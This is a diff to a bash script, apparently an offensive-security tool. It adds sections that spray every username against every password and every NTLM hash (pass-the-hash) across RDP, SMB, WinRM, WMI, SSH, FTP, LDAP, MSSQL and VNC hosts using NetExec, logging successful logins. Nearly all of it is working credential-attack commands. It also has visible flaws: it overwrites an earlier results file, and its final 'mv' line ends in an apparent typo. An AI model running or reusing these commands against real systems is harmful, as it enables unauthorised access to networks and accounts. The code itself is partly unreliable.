@@ -300,7 +300,6 @@ tee /dev/tty | \
 tee -a valid_service_logins.txt | \
 awk -F'\' '{print $2}' | \
 awk -F':' '{print $1 >> "NTLM_no_brute_users.txt"; print $2 >> "NTLM_no_brute_pass.txt"}'
-# Note: need to parse the logins, then brute force against all services with these logins
 
 
 # SECTION 6 - TRY VALID USER:NTLM HASH COMBOS AGAINST RDP, SMB, WINRM, WMI, LDAP, and MSSQL
@@ -394,11 +393,132 @@ grep -iE " \\[\\+\\] |error" | \
 tee -a valid_NTLM_hash_logins.txt
 
 
-# SECTION 9 - CLEANUP
+# SECTION 9 - TRY ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST RDP, SMB, WINRM, WMI, SSH, FTP, LDAP, MSSQL, and VNC
+touch valid_service_logins.txt
+echo "" > valid_service_logins.txt
+
+# RDP
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST RDP----------\033[0m\n\n"
+echo -e "\nRDP Local Authenication:\n"
+nxc rdp rdp_hosts.txt --local-auth -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# SMB
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST SMB----------\033[0m\n\n"
+echo -e "\nSMB Local Authenication:\n"
+nxc smb smb_hosts.txt --local-auth -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# WinRM
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST WINRM----------\033[0m\n\n"
+echo -e "\nWinRM Local Authenication:\n"
+nxc winrm winrm_hosts.txt --local-auth -u "$users_file" -p "$pass_file" --continue-on-success 2>&1 | \
+grep -v "CryptographyDeprecationWarning" | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# WMI
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST WMI----------\033[0m\n\n"
+echo -e "\nWMI Local Authenication:\n"
+nxc wmi wmi_hosts.txt --local-auth -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# SSH
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST SSH----------\033[0m\n\n"
+echo -e "\nSSH Local Authenication:\n"
+nxc ssh ssh_hosts.txt -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# FTP
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST FTP----------\033[0m\n\n"
+echo -e "\nFTP Local Authenication:\n"
+nxc ftp ftp_hosts.txt -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# LDAP
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST LDAP----------\033[0m\n\n"
+echo -e "\nLDAP Local Authenication:\n"
+nxc ldap ldap_hosts.txt --local-auth -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# MSSQL
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST MSSQL----------\033[0m\n\n"
+echo -e "\nMSSQL Local Authenication:\n"
+nxc mssql mssql_hosts.txt -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# VNC
+echo -e "\n\n\033[1;32m----------TRYING ALL USERS WITH ALL PASSWORDS LOCALLY AGAINST VNC----------\033[0m\n\n"
+echo -e "\nVNC Local Authenication:\n"
+nxc vnc vnc_hosts.txt -u "$users_file" -p "$pass_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+
+# SECTION 10 - TRY ALL USERS WITH ALL NTLM HASHES LOCALLY AGAINST RDP, SMB, WINRM, WMI, LDAP, and MSSQL
+
+# RDP
+echo -e "\n\n\033[1;32m----------TRYING ALL NTLM HASHES WITH ALL USERS LOCALLY AGAINST RDP----------\033[0m\n\n"
+echo -e "\nRDP Local Authenication:\n"
+nxc rdp rdp_hosts.txt --local-auth -u "$users_file" -H "$ntlm_hash_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# SMB
+echo -e "\n\n\033[1;32m----------TRYING ALL NTLM HASHES WITH ALL USERS LOCALLY AGAINST SMB----------\033[0m\n\n"
+echo -e "\nSMB Local Authenication:\n"
+nxc smb smb_hosts.txt --local-auth -u "$users_file" -H "$ntlm_hash_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# WinRM
+echo -e "\n\n\033[1;32m----------TRYING ALL NTLM HASHES WITH ALL USERS LOCALLY AGAINST WINRM----------\033[0m\n\n"
+echo -e "\nWinRM Local Authenication:\n"
+nxc winrm winrm_hosts.txt --local-auth -u "$users_file" -H "$ntlm_hash_file" --continue-on-success 2>&1 | \
+grep -v "CryptographyDeprecationWarning" | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# WMI
+echo -e "\n\n\033[1;32m----------TRYING ALL NTLM HASHES WITH ALL USERS LOCALLY AGAINST WMI----------\033[0m\n\n"
+echo -e "\nWMI Local Authenication:\n"
+nxc wmi wmi_hosts.txt --local-auth -u "$users_file" -H "$ntlm_hash_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# SSH does not support NTLM hash logins
+
+# FTP does not support NTLM hash logins
+
+# LDAP
+echo -e "\n\n\033[1;32m----------TRYING ALL NTLM HASHES WITH ALL USERS LOCALLY AGAINST LDAP----------\033[0m\n\n"
+echo -e "\nLDAP Local Authenication:\n"
+nxc ldap ldap_hosts.txt --local-auth -u "$users_file" -H "$ntlm_hash_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# MSSQL
+echo -e "\n\n\033[1;32m----------TRYING ALL NTLM HASHES WITH ALL USERS LOCALLY AGAINST MSSQL----------\033[0m\n\n"
+echo -e "\nMSSQL Local Authenication:\n"
+nxc mssql mssql_hosts.txt -u "$users_file" -H "$ntlm_hash_file" --continue-on-success | \
+grep -iE " \\[\\+\\] |error" | \
+tee -a valid_service_logins.txt
+
+# VNC does not support NTLM hash logins
+
+
+# SECTION 11 - CLEANUP
 rm -f domain_no_brute_passwords.txt
 rm -f domain_no_brute_users.txt
 rm -f NTLM_no_brute_pass.txt
 rm -f NTLM_no_brute_users.txt
 rm -f NTLM_users.txt
 mkdir hosts
-mv *_hosts.txt ./hosts/
+mv -f *_hosts.txt ./hosts/ks
